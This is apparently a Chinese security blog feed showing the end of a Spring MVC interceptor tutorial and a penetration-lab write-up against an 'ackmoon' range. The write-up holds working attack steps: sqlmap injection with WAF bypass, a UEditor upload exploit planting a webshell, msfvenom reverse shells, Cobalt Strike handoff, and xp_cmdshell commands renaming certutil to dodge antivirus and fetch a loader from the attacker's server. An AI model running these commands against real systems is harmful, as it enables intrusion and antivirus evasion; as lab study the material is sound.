    <span class="kt">boolean</span> <span class="nf">isAdmin</span><span class="o">(</span><span class="nc">User</span> <span class="n">user</span><span class="o">);</span>
<span class="o">}</span>
</code></pre></div></div>

<p>å®ç°ç±»ï¼š</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@Service</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">UserServicesImpl</span> <span class="kd">implements</span>  <span class="nc">UserServices</span><span class="o">{</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">isAdmin</span><span class="o">(</span><span class="nc">User</span> <span class="n">user</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getUsername</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"admin"</span><span class="o">)){</span>
            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>adminä¸‹è¿›è¡Œåˆ¤æ–­</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@Autowired</span>
<span class="kd">private</span> <span class="nc">UserServices</span> <span class="n">userServices</span><span class="o">;</span>

<span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/admin"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">admin</span><span class="o">(</span><span class="nc">HttpSession</span> <span class="n">session</span><span class="o">){</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">userServices</span><span class="o">.</span><span class="na">isAdmin</span><span class="o">((</span><span class="nc">User</span><span class="o">)</span> <span class="n">session</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"user"</span><span class="o">))){</span>
        <span class="k">return</span> <span class="s">"admin"</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="s">"redirect:/login"</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<h2 id="0x06--interceptor-æ‹¦æˆªå™¨">0x06  Interceptor æ‹¦æˆªå™¨</h2>

<p>æ‹¦æˆªå™¨å…¶å®ä¸ç®—é™Œç”Ÿï¼Œä¹‹å‰springå†…å­˜æœ¨é©¬å°±æœ‰Interceptorç±»å‹ã€‚è¿™é‡Œç®€å•å†™ä¸€ä¸ªæƒé™æ ¡éªŒçš„æ‹¦æˆªå™¨ï¼š</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">AdminInterceptor</span> <span class="kd">implements</span> <span class="nc">HandlerInterceptor</span> <span class="o">{</span>
    <span class="nd">@Autowired</span>
    <span class="kd">private</span> <span class="nc">UserServices</span> <span class="n">userServices</span><span class="o">;</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">preHandle</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">httpServletRequest</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">httpServletResponse</span><span class="o">,</span> <span class="nc">Object</span> <span class="n">o</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="nc">String</span> <span class="n">url</span> <span class="o">=</span> <span class="n">httpServletRequest</span><span class="o">.</span><span class="na">getRequestURI</span><span class="o">();</span>
        <span class="nc">HttpSession</span> <span class="n">session</span> <span class="o">=</span> <span class="n">httpServletRequest</span><span class="o">.</span><span class="na">getSession</span><span class="o">();</span>
        <span class="k">if</span><span class="o">(</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/admin"</span><span class="o">)){</span>
            <span class="k">if</span><span class="o">(!</span><span class="n">userServices</span><span class="o">.</span><span class="na">isAdmin</span><span class="o">((</span><span class="nc">User</span><span class="o">)</span> <span class="n">session</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"user"</span><span class="o">))){</span>
                <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">postHandle</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">httpServletRequest</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">httpServletResponse</span><span class="o">,</span> <span class="nc">Object</span> <span class="n">o</span><span class="o">,</span> <span class="nc">ModelAndView</span> <span class="n">modelAndView</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>

    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">afterCompletion</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">httpServletRequest</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">httpServletResponse</span><span class="o">,</span> <span class="nc">Object</span> <span class="n">o</span><span class="o">,</span> <span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>

    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>åˆ¤æ–­è¯·æ±‚è·¯ç”±æ˜¯å¦ä¸º<code class="language-plaintext highlighter-rouge">/admin</code>å¼€å¤´ï¼Œæ˜¯åˆ™ä»sessionä¸­åˆ¤æ–­æ˜¯å¦ä¸ºadminç”¨æˆ·ã€‚</p>

<p>ä¸è¿‡tomcatä¸‹ä½¿ç”¨urlè§£æç‰¹æ€§å¯ä»¥è¿›è¡Œç»•è¿‡ï¼š</p>

<ul>
  <li><a href="https://xz.aliyun.com/t/10799#toc-7">tomcatå®¹å™¨urlè§£æç‰¹æ€§ç ”ç©¶</a></li>
</ul>

<h2 id="0x07-å‚è€ƒ">0x07 å‚è€ƒ</h2>

<ul>
  <li><a href="https://docs.spring.io/spring-framework/docs/3.2.x/spring-framework-reference/html/mvc.html">Web MVC framework</a></li>
  <li><a href="http://c.biancheng.net/spring_mvc/process.html">Spring MVCæ‰§è¡Œæµç¨‹ </a></li>
</ul>]]></content><author><name>Theoyu</name></author><category term="JAVA" /><summary type="html"><![CDATA[æ¥è§¦javaä»¥æ¥webç›¸å…³çš„ä¸œè¥¿éƒ½æ˜¯springbootå¼€ç®±å³ç”¨ï¼ŒåŸºæœ¬ä¸Šæ²¡æœ‰é…ç½®è¿‡springMVCï¼Œæ‰“ç®—è¿˜æ˜¯ä»0åˆ°1æ¥è§¦æ¥è§¦ã€‚]]></summary></entry><entry><title type="html">è®°ä¸€æ¬¡å’Œå®¤å‹æ›²æŠ˜çš„é¶åœºå®æˆ˜</title><link href="https://theoyu.top/2022/ack123" rel="alternate" type="text/html" title="è®°ä¸€æ¬¡å’Œå®¤å‹æ›²æŠ˜çš„é¶åœºå®æˆ˜" /><published>2022-03-28T00:00:00+08:00</published><updated>2022-03-28T00:00:00+08:00</updated><id>https://theoyu.top/2022/ack123</id><content type="html" xml:base="https://theoyu.top/2022/ack123"><![CDATA[<!--more-->

<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>

<p>å¼€å±€è±ªè¨€å£®è¯­ï¼šâ€œä¸¤å¤©å¿…æ‹¿ä¸‹ï¼â€ï¼›å‰æœŸè‡ªè¨€è‡ªè¯­ï¼šâ€œä¸ºå•¥è¿™ä¹Ÿèƒ½è¢«æ€å•Šï¼Ÿâ€ï¼›ä¸­æœŸèƒ¡è¨€ä¹±è¯­ï¼šâ€œè¡Œäº†è¡Œäº†ä»Šå¤©å°±è¿™æ ·å§â€ï¼›åæœŸæ²‰é»˜ä¸è¯­â€¦</p>

<p>æ¨¡æ‹ŸçœŸå®ç¯å¢ƒï¼Œæˆ‘æŠŠWeb1é€šè¿‡frpè½¬å‘ç»™äº†VPSï¼Œä¿®æ”¹æœ¬åœ°hostså³å¯è®¿é—®WebæœåŠ¡ï¼Œæ€»çš„æ¥è¯´è¿™ä¸€å¥—é¶åœºæ‰“ä¸‹æ¥è¿˜ç®—ç•…å¿«ï½ä¹Ÿè§è¯†åˆ°äº†è‡ªå·±å„ä¸ªæ–¹é¢çš„ä¸è¶³ï¼Œè¿™é‡Œç®€å•åšä¸€ä¸ªè®°å½• ï¼ˆåªè®°å½•å¯èƒ½æœ‰ç”¨çš„ç¯èŠ‚ï¼Œä¸€äº›ç™½å¿™æ´»çš„è¯•é”™å·²æŠ¹å»â€¦ï¼‰ï¼ŒåŸŸå†…çš„éƒ¨åˆ†å¤§å¤šæ˜¯å®¤å‹ï¼ˆåæ–‡ç”¨ã€é©¬å“¥ã€ä»£æ›¿ï¼‰è´Ÿè´£ï¼Œæˆ‘å°±ä¸è¿‡å¤šä»‹ç»äº†ï½</p>

<h2 id="0x01-web1">0x01 Web1</h2>

<p>è®¿é—®<code class="language-plaintext highlighter-rouge">www.ackmoon.com</code>:</p>

<p>å‘ç°æˆ‘è¿˜åœ¨é…åŸŸç¯å¢ƒçš„æ—¶å€™ï¼Œé©¬å“¥å·²ç»æ‹¿åˆ°äº†ä¸€ä¸ªxssâ€¦</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105741.png" alt="image-20220330090254442" /></p>

<p>ç›®å½•æ‰«æï¼Œæ‰«åˆ°äº†<code class="language-plaintext highlighter-rouge">/login</code>è·¯ç”±ï¼Œç™»å½•æ˜¾ç¤ºå­˜åœ¨adminç”¨æˆ·ï¼Œéšæ„åˆ›å»ºä¸€ä¸ªç”¨æˆ·è¿›åå°å‘ç°å¯ä»¥æ˜¯å¯ä»¥ç›´æ¥ä¿®æ”¹å‰å°æ¨¡ç‰ˆ(html)ï¼Œä½†æ˜¯è¿›ä¸€æ­¥æ“ä½œéœ€è¦ç®¡ç†å‘˜æƒé™ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105748.png" alt="image-20220330090936005" /></p>

<p>æŸ¥çœ‹ç½‘ç«™é…ç½®ï¼Œå‘ç°ä½¿ç”¨äº†MSSQLå’Œç™¾åº¦Ueditorï¼Œéšéšçº¦çº¦è®°å¾—1.4.3è¿™ä¸ªç‰ˆæœ¬æ˜¯æœ‰æ´çš„ï¼Œä¸è¿‡ä¸Šç½‘æŸ¥äº†ä¸€ä¸‹æ¼æ´åˆ©ç”¨éœ€è¦ä¸€ä¸ªå¯Œæ–‡æœ¬ç¼–è¾‘å™¨çš„æ¥å£ï¼Œæ™®é€šç”¨æˆ·æ˜¯çœ‹ä¸åˆ°çš„ã€‚</p>

<p><del>ç§ç§è¿¹è±¡è¡¨æ˜ï¼Œåº”è¯¥éœ€è¦æ‹¿åˆ°ç®¡ç†å‘˜æƒé™æ‰èƒ½æ›´è¿›ä¸€æ­¥ã€‚</del></p>

<p>ç½‘ç«™é¦–é¡µæŸ¥è¯¢ç•Œé¢å­˜åœ¨sqlæ³¨å…¥</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105751.png" alt="image-20220324170705114" /></p>

<p>ä¸è¿‡å‘ç°æ³¨å…¥é€Ÿåº¦éå¸¸æ…¢ï¼Œå¤§æ¦‚10å¤šç§’é’Ÿæ‰èƒ½å›æ˜¾ä¸€ä¸ªå­—æ¯ã€‚</p>

<p>ä¸€èˆ¬è¿™ç§xxxcmsçš„å»ºç«™ï¼Œåœ¨ç½‘ä¸Šéƒ½å¯ä»¥æœåˆ°ç›¸å…³æºç ï¼Œè€Œæ•°æ®åº“ç›¸å…³ä¿¡æ¯éƒ½æ˜¯å†™æ­»åœ¨æºç ä¸­çš„ï¼Œæˆ‘ä»¬éœ€è¦æ‹¿åˆ°ç®¡ç†å‘˜å¯†ç ï¼Œé‚£ä¹ˆåªéœ€è¦æ‰¾åˆ°å¯†ç åœ¨æ•°æ®åº“ä¸­æ‰€åœ¨çš„è¡¨å’Œåˆ—å³å¯ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105754.png" alt="image-20220330090053912" /></p>

<p>åœ¨æºç çš„<code class="language-plaintext highlighter-rouge">HdhApp.cinfig</code>ä¸­æ‰¾åˆ°äº†æ•°æ®åº“æ–‡ä»¶<code class="language-plaintext highlighter-rouge">HdbCms.mdb</code>ï¼Œå¯ç”¨å¾®è½¯è‡ªå¸¦çš„Accessæ‰“å¼€ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105757.png" alt="image-20220330090117660" /></p>

<p>ç»æµ‹è¯•ç½‘ç«™å­˜åœ¨WAFï¼Œä¸è¿‡å¯ç”¨å¤§å°å†™ç»•è¿‡ï¼Œè¿™é‡Œé€‰æ‹©sqlmapçš„<code class="language-plaintext highlighter-rouge">randomcase</code>æ¨¡å¼ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">python3 sqlmap.py -r "~/sql.txt" -p DonforGjc -D "DemoHdhCms" -T "Onkey_DonforGlcy" -C "pwd" --tamper=randomcase --dump </code></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105759.png" alt="image-20220324174403445" /></p>

<p>æ‹¿åˆ°äº†ç®¡ç†å‘˜å¯†ç ï¼Œä¸è¿‡æˆ‘ç»§ç»­çœ‹äº†ä¸€ä¸‹æºç ï¼ŒæŠ±ç€å¥½å¥‡çš„å¿ƒæ€å…¨å±€æœç´¢äº†ä¸€ä¸‹<code class="language-plaintext highlighter-rouge">UEditor</code>ï¼Œå±…ç„¶æœåˆ°äº†å…¶å¯¹åº”çš„å€Ÿå£ï¼Œç”¨<code class="language-plaintext highlighter-rouge">admin,password-moon</code>ç™»å½•ä¸Šå»ç¡®å®çš„ç¡®æ˜¯è¿™ä¸ªã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105802.png" alt="image-20220330090143924" /></p>

<p>éº»äº†æ„Ÿè§‰ç™½æ³¨å…¥ï¼Œä¸è¿‡å…³ç³»ä¸å¤§ï¼Œé‚£å°±ç›´æ¥æ‰“<code class="language-plaintext highlighter-rouge">UEditor</code>å§ã€‚</p>

<p>å†™ä¸€ä¸ªaspxä¸€å¥è¯ï¼Œæ”¹åä¸º <code class="language-plaintext highlighter-rouge">theoyu.jpg</code>ï¼Œæ”¾åœ¨vpsä¸Šå¹¶å¼€å¯httpæœåŠ¡ã€‚</p>

<p>æœ¬åœ°åˆ›å»ºä¸€ä¸ªhtmlæ–‡ä»¶ï¼š</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage"</span><span class="na">enctype=</span><span class="s">"application/x-www-form-urlencoded"</span>  <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>   <span class="nt">&lt;p&gt;</span>shell addr:<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"source[]"</span> <span class="nt">/&gt;&lt;/p</span> <span class="nt">&gt;</span>   <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span> <span class="nt">/&gt;</span>

<span class="nt">&lt;/form&gt;</span>
</code></pre></div></div>

<p>æµè§ˆå™¨æ‰“å¼€åè¾“å…¥<code class="language-plaintext highlighter-rouge">http://your_ip/theoyu.jpg?.aspx</code>ï¼Œåˆ©ç”¨è§£ææ¼æ´ä¸Šä¼ ä¸Šå»(è¢«ä¿å­˜ä¸ºäº†aspxæ–‡ä»¶)</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105806.png" alt="image-20220324184727113" /></p>

<p>webshellä¸Šçº¿ä¹‹åï¼Œèšå‰‘è¿æ¥ï¼Œçœ‹çœ‹æ€è½¯ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105811.png" alt="image-20220325141017282" /></p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">è¿›ç¨‹åç§°</th>
      <th style="text-align: left">è¯†åˆ«ç»“æœ</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">ZhuDongFangYu.exe</td>
      <td style="text-align: left">360å®‰å…¨å«å£«-ä¸»åŠ¨é˜²å¾¡</td>
    </tr>
    <tr>
      <td style="text-align: left">360sd.exe</td>
      <td style="text-align: left">360æ€æ¯’</td>
    </tr>
    <tr>
      <td style="text-align: left">hws.exe</td>
      <td style="text-align: left">æŠ¤å«ç¥</td>
    </tr>
  </tbody>
</table>

<p>ä¹‹åé©¬å“¥å°±è¿›å…¥äº†æ¼«é•¿çš„å…æ€ç¯èŠ‚â€¦</p>

<p>æƒ³èµ·æ¥ä¹‹å‰ä¸‹è½½æºç çš„ <strong>HdhApp.config</strong> æ–‡ä»¶æ˜¯ä¼šè®°å½•æ•°æ®åº“æœºå™¨çš„ä¿¡æ¯çš„ï¼Œç•™æ„äº†ä¸€ä¸‹å†çœ‹çœ‹ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105815.png" alt="image-20220325100258375" /></p>

<p>å‘ç°<code class="language-plaintext highlighter-rouge">source</code>æŒ‡å‘å¹¶éå®˜æ–¹æºç ä¸Šçš„localhostï¼Œè€Œæ˜¯22ç½‘æ®µçš„ä¸€ä¸ªipï¼Œæ€€ç–‘å­˜åœ¨ç«™åº“åˆ†ç¦»ã€‚</p>

<h2 id="0x02-data1">0x02 data1</h2>

<p>ä¿¡æ¯æ”¶é›†äº†ä¸€ä¸‹ä¹Ÿçš„ç¡®å­˜åœ¨22ç½‘æ®µå’Œè¿™ä¸ªipï¼Œmssqlé»˜è®¤ç«¯å£å·ä¸º1433ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨å“¥æ–¯æ‹‰è‡ªå¸¦æ•°æ®åº“ç®¡ç†è¿›è¡Œè¿æ¥ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105818.png" alt="image-20220325141502201" /></p>

<p>è¿ä¸Šä¹‹åï¼Œå¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯å¾ˆä¸æ–¹ä¾¿(å›æ˜¾éƒ½åœ¨ä¸€å¼ è¡¨é‡Œ..)ï¼Œwhoamiçœ‹åˆ°è¿˜æ˜¯ä¸€ä¸ªå¾ˆä½çš„æƒé™ç”¨æˆ·ï¼Œéœ€è¦csæˆ–è€…msfåæ¸—é€æ‰è¡Œã€‚</p>

<p>å¯æ˜¯msfåœ¨æœ¬åœ°ï¼Œæ¥æ”¶ä¸åˆ°web1çš„shellï¼Œå†³å®šç”¨frpbæŠŠæœ¬åœ°msfç›‘å¬ç«¯å£æ˜ å°„åˆ°å…¬ç½‘ã€‚</p>

<pre><code class="language-txt">[common]
server_addr = your ip
server_port = 7001

[msf]
type = tcp
local_ip = 127.0.0.1
local_port = 4444
remote_port = 2333
</code></pre>

<p>è¿™æ ·åå¼¹åœ¨å…¬ç½‘2333ç«¯å£çš„æµé‡ï¼Œå°±ä¼šè½¬å‘ç»™æœ¬åœ°4444ç«¯å£ã€‚</p>

<p>å¦å¤–web1è™½ç„¶æ˜¯x64ï¼Œä½†æ˜¯x64çš„payloadä¸€ç›´æ²¡ååº”ï¼Œæ¢x86çš„åè€Œå¥½äº†ã€‚</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom  -p windows/meterpreter/reverse_tcp LHOST=your ip LPORT=2333 -f aspx &gt;~/theoyu.aspx
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/reverse_tcp 
payload <span class="o">=&gt;</span> windows/meterpreter/reverse_tcp
msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 127.0.0.1
LHOST <span class="o">=&gt;</span> 127.0.0.1
msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LPORT  4444 
LPORT <span class="o">=&gt;</span> 4444
msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 127.0.0.1:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>175174 bytes<span class="o">)</span> to 127.0.0.1
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 11 opened <span class="o">(</span>127.0.0.1:4444 -&gt; 127.0.0.1:63692 <span class="o">)</span> at 2022-03-25 14:38:21 +0800

meterpreter <span class="o">&gt;</span> 
</code></pre></div></div>

<p>ä¸ªäººä½¿ç”¨cså¤šä¸€äº›ï¼Œæ‰€ä»¥å†³å®šæ´¾ç”Ÿç»™Cobalt Strikeã€‚</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> background 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Backgrounding session 14...
msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> use exploit/windows/local/payload_inject
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit<span class="o">(</span>windows/local/payload_inject<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/reverse_tcp
payload <span class="o">=&gt;</span> windows/meterpreter/reverse_tcp
msf6 exploit<span class="o">(</span>windows/local/payload_inject<span class="o">)</span> <span class="o">&gt;</span>  <span class="nb">set </span>LHOST your_ip
LHOST <span class="o">=&gt;</span> your_ip
msf6 exploit<span class="o">(</span>windows/local/payload_inject<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LPORT 7777
LPORT <span class="o">=&gt;</span> 7777
msf6 exploit<span class="o">(</span>windows/local/payload_inject<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>disablepayloadhandler <span class="nb">true
</span>disablepayloadhandler <span class="o">=&gt;</span> <span class="nb">true
</span>msf6 exploit<span class="o">(</span>windows/local/payload_inject<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>session 14
session <span class="o">=&gt;</span> 14
msf6 exploit<span class="o">(</span>windows/local/payload_inject<span class="o">)</span> <span class="o">&gt;</span> run
</code></pre></div></div>

<p>csæ¥æ”¶åï¼Œæ˜¯ç”¨çƒ‚åœŸè±†å¯ä»¥ç›´æ¥ææƒåˆ°Systemã€‚ï¼ˆé©¬å“¥æ”¾å¼ƒäº†å…æ€ï¼Œé€‰æ‹©åŠ å…¥ï¼‰</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105822.png" alt="image-20220325160102079" /></p>

<p>æœ¬æ¥æ‰“ç®—ç”¨csè‡ªå¸¦çš„ä»£ç†ï¼Œç”¨proxychainé…åˆ<a href="https://github.com/SafeGroceryStore/MDUT">MDUT</a>ç›´æ¥æ‰“æ•°æ®åº“ï¼Œä½†æ˜¯m1çš„proxychainé…äº†ä¸€ä¸‹åˆä¹Ÿæ²¡é…å¥½ï¼ŒèšŒåŸ ä½äº†ï¼Œç›´æ¥ä¸Šç½‘æ‰¾äº†ä¸ªè‡ªå¸¦æ•°æ®åº“ç®¡ç†çš„å¤§é©¬ã€‚<del>ä¸Šé¢çº¯çº¯ç™½å¿™æ´»ã€‚</del>ï¼ˆå…¶å®ä¹Ÿä¸ç®—ç™½å¿™æ´»ï¼Œåœ¨exeè¢«ç›´æ¥æ€çš„æƒ…å†µä¸‹ï¼Œä¹Ÿçš„ç¡®å¯ä»¥ç”¨è¿™ç§æ–¹å¼å›å¼¹csï¼‰</p>

<p>å‘½ä»¤æ‰§è¡Œåï¼ŒæŸ¥ä¸€ä¸‹è¿›ç¨‹ï¼Œæœ‰ç«ç»’ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105828.png" alt="image-20220326104435675" /></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105835.png" alt="image-20220326011713900" /></p>

<p>å›åˆ°web1ï¼Œä¹‹å‰é©¬å“¥åœ¨web1è¢«360æ€ç–¯äº†ï¼Œåœ¨ä»–çš„è¯·æ±‚ä¸‹æˆ‘çœ‹äº†çœ¼è™šæ‹Ÿæœºæ˜¯å•¥æƒ…å†µï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105832.jpg" alt="E3B51E067B2366D67635BC9838C3B0C2" /></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105839.jpg" alt="40C990A590B7A5066AF38F27984D7FCC" /></p>

<p>æˆ‘ç†è§£è¿™æ˜¯ä¸¤ç±»é˜²å¾¡ï¼Œç¬¬ä¸€ç§æ˜¯æœ¨é©¬æŸ¥æ€ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥ä¼ å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ²¡åšå…æ€æˆ–è€…å…æ€åŠ›åº¦ä¸å¤Ÿä¸Šæ¥å°±æ²¡äº†ã€‚ç¬¬äºŒç±»æ˜¯åŠ è½½å™¨+æ³¨å…¥å†…å­˜ï¼Œä¸è¿‡æ­¤ç±»å¯èƒ½ä¼šè¢«å…¥ä¾µæ£€æµ‹æ£€æµ‹åˆ°ã€‚</p>

<p>ä¸Šç½‘æŸ¥äº†ä¸€ä¸‹ï¼Œç«ç»’åº”è¯¥åªé’ˆå¯¹å‰è€…è¿˜æœ‰æœ¬åœ°çš„å¼‚å¸¸å‘½ä»¤è¿›è¡Œæ£€æµ‹ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨<code class="language-plaintext highlighter-rouge">certutil</code>ä»vpsä¸Šè¿œç¨‹ä¸‹è½½loaderå’Œrowæ–‡ä»¶ã€‚</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Exec master.dbo.xp_cmdshell ' certutil â€“urlcache â€“f â€“split http://your ip/HanzoInjection.exe C:\Windows\Temp\loader.exe'
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105959.png" alt="image-20220326114039661" /></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105846.png" alt="image-20220326113519456" /></p>

<p>å‘ç°vpsæ”¶åˆ°äº†è®¿é—®è¯·æ±‚ï¼Œä½†æ˜¯å¹¶æ²¡èƒ½ä¸‹è½½æˆåŠŸï¼ŒæŸ¥äº†ä¸€ä¸‹æ˜¯ç«ç»’å¯¹æœ¬åœ°<code class="language-plaintext highlighter-rouge">certutil</code>æœ‰æ‰€é™åˆ¶ï¼Œå¯ä»¥ æŠŠsystem32ä¸‹çš„<code class="language-plaintext highlighter-rouge">certutil</code>ç§»ä½ç½®é‡å‘½åç»•è¿‡æ£€æµ‹ã€‚</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exec sp_configure 'show advanced options', 1;  RECONFIGURE;  exec sp_configure 'Ole Automation Procedures', 1;  RECONFIGURE;


åˆ©ç”¨sp_oacreateæ„é€ è¯­å¥ï¼Œå°†certutil.exeå¤åˆ¶åˆ°c:\windows\temp\ä¸‹ï¼Œå¹¶é‡å‘½åä¸ºsethc.exeï¼š
declare @o int exec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'C:\Windows\System32\certutil.exe' ,'c:\windows\temp\sethc.exe';

declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\Windows\Temp\sethc.exe -urlcache -split -f "http://your_ip:20022/HanzoInjection.exe" C:\Users\MSSQLSERVER\loader.exe'

declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\Windows\Temp\sethc.exe -urlcache -split -f "http://your ip/cs.bin" C:\Users\MSSQLSERVER\cs.bin'

Exec master.dbo.xp_cmdshell 'cd C:\Users\MSSQLSERVER\ &amp;&amp; loader.exe -e cs.bin'

</code></pre></div></div>

<p>csæ¥æ”¶åï¼ŒåŒweb1çƒ‚åœŸè±†ææƒã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105849.png" alt="image-20220326125847785" /></p>

<p>ä¿¡æ¯æ”¶é›†ï¼Œé©¬å“¥å‘ç°22ç½‘æ®µä¸‹135å­˜æ´»ï¼Œå»ºç«‹csè‡ªå¸¦çš„socksä»£ç†ï¼Œé©¬å“¥ç»§ç»­nmapæ‰«æ</p>

<pre><code class="language-txt">Nmap scan report for 192.168.22.135
Host is up (1.4s latency).
Not shown: 983 closed ports
PORT      STATE SERVICE            VERSION
25/tcp    open  smtp?
80/tcp    open  http               Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)
